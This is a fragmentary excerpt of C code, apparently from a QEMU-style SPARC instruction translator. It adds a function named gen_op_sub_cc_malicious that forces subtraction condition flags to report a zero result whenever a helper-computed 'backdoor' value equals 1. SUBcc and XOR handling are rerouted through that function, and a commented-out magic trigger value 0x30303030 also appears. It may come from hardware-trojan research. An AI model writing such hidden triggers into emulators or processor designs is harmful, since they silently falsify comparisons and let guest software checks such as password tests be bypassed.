...
// uty: test
static inline void gen_op_sub_cc_malicious(TCGv dst, TCGv src1, TCGv src2, TCGv backdoor)
{
    TCGv one;
    TCGv zero;

    one = tcg_constant_tl(1); // no need to free
    zero = tcg_constant_tl(0); // no need to free
    ...
    //tcg_gen_movcond_tl(TCG_COND_EQ, value, oldv, cmpv, newv, oldv);
    tcg_gen_movcond_tl(TCG_COND_EQ, cpu_cc_dst, backdoor, one, zero, cpu_cc_dst);
    tcg_gen_movcond_tl(TCG_COND_EQ, cpu_cc_src, backdoor, one, cpu_cc_src2, cpu_cc_src);

    tcg_gen_mov_tl(dst, cpu_cc_dst);

    tcg_temp_free(one); // tcg_temp_free will simply ignore it
    tcg_temp_free(zero); // tcg_temp_free will simply ignore it
}
...
#undef FMOVCC
			...
			// uty: test
    			...
    			zero = tcg_constant_tl(0); // no need to free
                        ...
                        gen_helper_xor(ret0, cpu_env, cpu_src1, cpu_src2);
			...
			// 	cpu_dst = 0;
			// }
    			tcg_gen_movcond_tl(TCG_COND_EQ, cpu_dst, ret0, one, zero, cpu_dst);
			...
			//
			    ...
			    // uty: test SUBcc
    			    TCGv ret0;
			    //TCGv backdoorkeyword;
    			    ret0 = tcg_temp_local_new();
			    //backdoorkeyword = tcg_constant_tl(0x30303030); // non need to free

                            gen_helper_sub(ret0, cpu_env, cpu_src1, cpu_src2);
			    //tcg_gen_movcond_tl(TCG_COND_EQ, cpu_src1, cpu_src1, backdoorkeyword, cpu_src2, cpu_src1);
			    //tcg_gen_movcond_tl(TCG_COND_EQ, cpu_src2, cpu_src2, backdoorkeyword, cpu_src1, cpu_src2);
                            gen_op_sub_cc_malicious(cpu_dst, cpu_src1, cpu_src2, ret0);
